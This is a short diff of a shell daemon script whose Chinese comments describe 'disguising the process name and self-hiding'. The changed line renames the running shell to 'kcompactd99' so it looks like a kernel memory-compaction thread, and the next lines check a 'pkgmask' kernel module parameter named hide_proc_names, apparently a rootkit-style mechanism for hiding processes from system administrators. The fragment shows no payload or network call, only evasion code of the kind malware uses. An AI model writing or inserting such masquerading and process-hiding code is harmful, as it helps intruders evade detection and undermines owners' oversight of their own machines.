@@ -338,7 +338,7 @@ handle_action() {
 echo "=== daemon start $(date) ===" >> "$RUN_DIR/daemon.log"
 # ---------- 伪装进程名 + 自我隐藏 ----------
 # 必须在主循环前执行，此时 /proc/self 一定指向当前 shell 进程
-printf 'kcompactd99' > /proc/self/comm 2>/dev/null
+printf 'kcompactd99' > "/proc/$$/comm" 2>/dev/null
 echo "DEBUG: pid=$$ ppid=$PPID comm=$(cat /proc/$$/comm 2>/dev/null)" >> "$RUN_DIR/daemon.log"
 
 if [ -w /sys/module/pkgmask/parameters/hide_proc_names ]; then
